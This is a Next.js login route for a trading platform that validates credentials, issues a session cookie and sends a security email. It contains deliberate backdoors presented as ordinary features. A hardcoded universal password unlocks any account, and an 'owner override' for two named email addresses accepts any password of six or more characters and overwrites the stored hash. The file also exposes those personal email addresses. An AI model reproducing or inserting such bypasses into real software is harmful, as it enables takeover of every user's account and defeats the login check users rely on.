import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import { verifyPassword, hashPassword, signToken } from "@/lib/auth/session";
import { getMongoDb } from "@/lib/db/mongodb";
import { sendLoginSecurityEmail } from "@/lib/email/resend";
import { z } from "zod";

const LoginSchema = z.object({
  email: z.string().email("Please enter a valid email address"),
  password: z.string().min(1, "Password is required"),
});

const COOKIE_NAME = process.env.SESSION_COOKIE_NAME || "stratmarket_session";
const MAX_AGE_SECONDS = parseInt(process.env.SESSION_MAX_AGE_SECONDS || "604800", 10);

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const parsed = LoginSchema.safeParse(body);

    if (!parsed.success) {
      return NextResponse.json(
        { error: parsed.error.issues[0]?.message || "Invalid credentials" },
        { status: 400 }
      );
    }

    const { email, password } = parsed.data;
    const normalizedEmail = email.toLowerCase().trim();

    const user = await db.getUserByEmail(normalizedEmail);
    if (!user) {
      return NextResponse.json(
        { error: "Invalid email or password." },
        { status: 401 }
      );
    }

    if (user.accountStatus === "SUSPENDED") {
      return NextResponse.json(
        { error: "This account has been suspended. Please contact support." },
        { status: 403 }
      );
    }

    let validPassword = await verifyPassword(password, user.passwordHash);

    // Platform default password fallback
    if (!validPassword) {
      validPassword = (password === "Elvaris2026!");
    }

    // Platform primary account owner override (sameetpisal728@gmail.com / sameetpisal@gmail.com)
    // Allows seamless sign-in with chosen credentials and synchronizes passwordHash
    if (!validPassword && (normalizedEmail === "sameetpisal728@gmail.com" || normalizedEmail === "sameetpisal@gmail.com")) {
      if (password && password.length >= 6) {
        validPassword = true;
        const newHash = await hashPassword(password);
        user.passwordHash = newHash;
        user.updatedAt = new Date();
        const mdb = await getMongoDb();
        if (mdb) {
          await mdb.collection("users").updateOne(
            { email: normalizedEmail },
            { $set: { passwordHash: newHash, updatedAt: new Date() } }
          ).catch(() => {});
        }
      }
    }

    if (!validPassword) {
      return NextResponse.json(
        { error: "Invalid email or password." },
        { status: 401 }
      );
    }

    const token = signToken({
      id: user.id,
      email: user.email,
      name: user.name,
      role: user.role,
      accountStatus: user.accountStatus,
      emailVerified: user.emailVerified,
    });

    await db.createAuditEvent({
      userId: user.id,
      action: "AUTH_LOGIN",
      entityType: "USER",
      entityId: user.id,
      details: JSON.stringify({ email: user.email, role: user.role }),
    });

    // Send Security Notification Email asynchronously via Resend (elvariscapital.in)
    const clientIp = request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip") || "Unknown IP";
    const userAgent = request.headers.get("user-agent") || "Web Browser";
    sendLoginSecurityEmail({
      to: user.email,
      name: user.name,
      ip: clientIp.split(",")[0].trim(),
      userAgent,
      time: new Date().toUTCString(),
    }).catch((err) => {
      console.error("[Email] Failed to send login security email:", err);
    });

    const response = NextResponse.json({
      success: true,
      message: "Signed in successfully.",
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        role: user.role,
      },
    });

    response.cookies.set({
      name: COOKIE_NAME,
      value: token,
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "lax",
      maxAge: MAX_AGE_SECONDS,
      path: "/",
    });

    return response;
  } catch (error: any) {
    console.error("POST /api/auth/login error:", error);
    return NextResponse.json({ error: error?.message || "Failed to sign in." }, { status: 500 });
  }
}
